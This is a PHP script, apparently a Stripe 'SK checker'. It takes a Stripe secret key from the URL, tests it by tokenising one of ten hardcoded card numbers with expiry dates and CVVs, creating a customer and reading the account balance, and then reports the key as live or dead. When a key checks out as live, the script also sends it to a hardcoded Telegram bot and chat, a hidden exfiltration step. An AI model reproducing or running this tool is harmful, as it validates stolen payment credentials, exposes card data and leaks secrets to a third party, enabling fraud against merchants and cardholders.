<?php

error_reporting(0);
ini_set('display_errors', 0);

/*===[Setup]=====================*/
$sk = $_GET['sk'];

/*===[SK]========================*/
if($sk == ""){
    exit();
}

/*===[CC Info Randomizer]=================*/
$cc_info_arr[] = "4147202411104480|01|2024|919";
$cc_info_arr[] = "4427323412047246|03|2025|056";
$cc_info_arr[] = "5314620064182111|09|2028|405";
$cc_info_arr[] = "6011209825580930|03|2028|434";
$cc_info_arr[] = "4342562442889422|09|2026|217";
$cc_info_arr[] = "4403935008537641|11|2029|942";
$cc_info_arr[] = "4427323412680368|07|2025|788";
$cc_info_arr[] = "4924960341663904|11|2023|348";
$cc_info_arr[] = "4238161473838718|01|2026|458";
$cc_info_arr[] = "4659022794169029|10|2025|336";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/*===[Variable Setup]=========================================*/
$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");

/*===[ Auth 1 ]==============*/

$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
curl_close($ch1);

/* One Response */
$res1 = json_decode($curl1, true);


/*===[ Auth 2 ]==============*/

if(isset($res1['id'])){
    /* Two */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, "email=$email&description=Tikol4Life&source=".$res1["id"]);
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    curl_close($ch2);

    /* Two Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];
}

// echo ''.$res2.''


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$r2 = curl_exec($ch);
// echo $r2;
$data = json_decode($r2, true);

$curr = $data['available'][0]['currency'];
$balance = $data['available'][0]['amount'];
$pending = $data['pending'][0]['amount'];

$skval = 100; // Update with the appropriate scaling factor

if (strpos($curr, 'usd') !== false) {
  $currn = '$';
  $currf = '🇺🇸';
  $currs = 'USD';
  $country = 'United States';
} elseif (strpos($curr, 'inr') !== false) {
  $currn = '₹';
  $currf = '🇮🇳';
  $currs = 'INR';
  $country = 'India';
} elseif (strpos($curr, 'cad') !== false) {
  $currn = '$';
  $currf = '🇨🇦';
  $currs = 'CAD';
  $country = 'Canada';
} elseif (strpos($curr, 'aud') !== false) {
  $currn = 'A$';
  $currf = '🇦🇺';
  $currs = 'AUD';
  $country = 'Australia';
} elseif (strpos($curr, 'aed') !== false) {
  $currn = 'د.إ';
  $currf = '🇦🇪';
  $currs = 'AED';
  $country = 'United Arab Emirates';
} elseif (strpos($curr, 'sgd') !== false) {
  $currn = 'S$';
  $currf = '🇸🇬';
  $currs = 'SGD';
  $country = 'Singapore';
} elseif (strpos($curr, 'nzd') !== false) {
  $currn = '$';
  $currf = '🇳🇿';
  $currs = 'NZD';
  $country = 'New Zealand';
} elseif (strpos($curr, 'eur') !== false) {
  $currn = '€';
  $currf = '🇪🇺';
  $currs = 'EUR';
  $country = 'European Union';
} elseif (strpos($curr, 'gbp') !== false) {
  $currn = '£';
  $currf = '🇬🇧';
  $currs = 'GBP';
  $country = 'United Kingdom';
} elseif (strpos($curr, 'jpy') !== false) {
  $currn = '¥';
  $currf = '🇯🇵';
  $currs = 'JPY';
  $country = 'Japan';
} elseif (strpos($curr, 'mxn') !== false) {
  $currn = '$';
  $currf = '🇲🇽';
  $currs = 'MXN';
  $country = 'Mexico';
} else {
  $currn = 'N/A';
  $currf = 'N/A';
  $currs = $curr;
  $country = 'N/A';
}

$pending = $pending / $skval;
$balance = $balance / $skval;

// ---------------------------------------------------- Hit To Telegram Start----------------------------
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
$chatID = urlencode('-850313265');

$charged_message = "$sk";

$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text=' . urlencode($charged_message) . '';

$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;
// ---------------------------------------------------- Hit To Telegram End-------------------------------



/*===[Response]=======================*/

if(isset($res1['error'])){

    if ($res1['error']['type'] == 'invalid_request_error' && strpos($res1['error']['message'], 'rate limit exceeded') !== false) {
        if (isset($res2['error']['code']) && $res2['error']['code'] === 'testmode_charges_only' || strpos($sk, 'test') !== false) {
            // dead
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {
            //rate limited
        echo '<span style="color:#ff5500;"><b>Response:</b></span> <font style="color:#20ff00;"><b>Rate Limited</b><br>
        
        <span style="color:#ff5500;"><b>Key:</b></span> <font style="color:#20ff00;"><b>'.$sk.'</b><br>

        <span style="color:#ff5500;"><b>Available Balance:</b></span> <font style="color:#20ff00;"><b>$'.$balance.'</b><br>

        <span style="color:#ff5500;"><b>Pending Balance:</b></span> <font style="color:#20ff00;"><b>$'.$pending.'</b><br>
        
        <span style="color:#ff5500;"><b>Country:</b></span> <font style="color:#20ff00;"><b>$'.$country.'</b><br>

        <span style="color:#ff5500;"><b>Currency:</b></span> <font style="color:#20ff00;"><b>$'.$currs.'</b><br>';
        echo '<br>';
        while (!$sendchargedtotg && $num_retries < $max_retries) {
            $sendchargedtotg = @file_get_contents($sendcharged);
            $num_retries++;
        }
    }
      
    }
    
    elseif ($res1['error']['type'] == 'invalid_request_error') {
        // dead
        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
    }

    else{
        if (isset($res2['error']['code']) && ($res2['error']['code'] === 'testmode_charges_only' || $res2['error']['decline_code'] === 'test_mode_live_card')) {
            // testmode
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {
            // live
            echo '<span style="color:#ff5500;"><b>Response:</b></span> <font style="color:#20ff00;"><b>Live</b><br>
        
            <span style="color:#ff5500;"><b>Key:</b></span> <font style="color:#20ff00;"><b>'.$sk.'</b><br>
    
            <span style="color:#ff5500;"><b>Available Balance:</b></span> <font style="color:#20ff00;"><b>$'.$balance.'</b><br>
    
            <span style="color:#ff5500;"><b>Pending Balance:</b></span> <font style="color:#20ff00;"><b>$'.$pending.'</b><br>
            
            <span style="color:#ff5500;"><b>Country:</b></span> <font style="color:#20ff00;"><b>$'.$country.'</b><br>
    
            <span style="color:#ff5500;"><b>Currency:</b></span> <font style="color:#20ff00;"><b>$'.$currs.'</b><br>';
            echo '<br>';
            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
      
        }
    }
    
}else{

    if(isset($res2['error'])){
        
        if ($res1['error']['type'] == 'invalid_request_error' && $res1['error']['code'] == 'rate_limit') {
            if (isset($res2['error']['code']) && ($res2['error']['code'] === 'testmode_charges_only' || $res2['error']['decline_code'] === 'test_mode_live_card') || strpos($sk, 'test') !== false ) {

                //dead 
                echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
            } else {

                // rate limited
                echo '<span style="color:#ff5500;"><b>Response:</b></span> <font style="color:#20ff00;"><b>Rate Limited</b><br>
        
                <span style="color:#ff5500;"><b>Key:</b></span> <font style="color:#20ff00;"><b>'.$sk.'</b><br>
        
                <span style="color:#ff5500;"><b>Available Balance:</b></span> <font style="color:#20ff00;"><b>$'.$balance.'</b><br>
        
                <span style="color:#ff5500;"><b>Pending Balance:</b></span> <font style="color:#20ff00;"><b>$'.$pending.'</b><br>
                
                <span style="color:#ff5500;"><b>Country:</b></span> <font style="color:#20ff00;"><b>$'.$country.'</b><br>
        
                <span style="color:#ff5500;"><b>Currency:</b></span> <font style="color:#20ff00;"><b>$'.$currs.'</b><br>';
                echo '<br>22';
                echo $curl1;
                echo $curl2;
                while (!$sendchargedtotg && $num_retries < $max_retries) {
                    $sendchargedtotg = @file_get_contents($sendcharged);
                    $num_retries++;
                }
            ;}
    } 
    
    elseif ($res1['error']['type'] == 'invalid_request_error' || $res2['error']['type'] == 'invalid_request_error') {

        // dead
        echo '<span class="badge badge-danger"><b>#DEAD</b></span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
    }

    else{
        if (isset($res2['error']['code']) && ($res2['error']['code'] === 'testmode_charges_only' || $res2['error']['decline_code'] === 'test_mode_live_card') || strpos($sk, 'test') !== false) {

            //testmode
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {

            //live
            echo '<span style="color:#ff5500;"><b>Response:</b></span> <font style="color:#20ff00;"><b>Live</b><br>
        
            <span style="color:#ff5500;"><b>Key:</b></span> <font style="color:#20ff00;"><b>'.$sk.'</b><br>
    
            <span style="color:#ff5500;"><b>Available Balance:</b></span> <font style="color:#20ff00;"><b>$'.$balance.'</b><br>
    
            <span style="color:#ff5500;"><b>Pending Balance:</b></span> <font style="color:#20ff00;"><b>$'.$pending.'</b><br>
            
            <span style="color:#ff5500;"><b>Country:</b></span> <font style="color:#20ff00;"><b>$'.$country.'</b><br>
    
            <span style="color:#ff5500;"><b>Currency:</b></span> <font style="color:#20ff00;"><b>$'.$currs.'</b><br>';
            echo '<br>';
            echo $curl2;
            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
        }
    }
//'.$curl1.''.$curl2.'
    }
    else{
       
        
        if (isset($res2['error']['code']) && ($res2['error']['code'] === 'testmode_charges_only' || $res2['error']['decline_code'] === 'test_mode_live_card')) {

            //testmode
            echo '<span class="badge badge-danger"><b>#DEAD</b></span><span style="color: rgb(0 255 0);  font-weight: bold"> [testmode_charges_only]</span> <font style="color:#ff3e3e;"><b>'.$sk.'</b><br>';
        } else {

            // live
              echo '<span style="color:#ff5500;"><b>Response:</b></span> <font style="color:#20ff00;"><b>Live</b><br>
        
            <span style="color:#ff5500;"><b>Key:</b></span> <font style="color:#20ff00;"><b>'.$sk.'</b><br>
    
            <span style="color:#ff5500;"><b>Available Balance:</b></span> <font style="color:#20ff00;"><b>$'.$balance.'</b><br>
    
            <span style="color:#ff5500;"><b>Pending Balance:</b></span> <font style="color:#20ff00;"><b>$'.$pending.'</b><br>
            
            <span style="color:#ff5500;"><b>Country:</b></span> <font style="color:#20ff00;"><b>$'.$country.'</b><br>
    
            <span style="color:#ff5500;"><b>Currency:</b></span> <font style="color:#20ff00;"><b>$'.$currs.'</b><br>';
            echo '<br>';


            while (!$sendchargedtotg && $num_retries < $max_retries) {
                $sendchargedtotg = @file_get_contents($sendcharged);
                $num_retries++;
            }
        }
    }
}


/*===[PHP Functions]==========================================*/
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@yahoo.com';
}
?>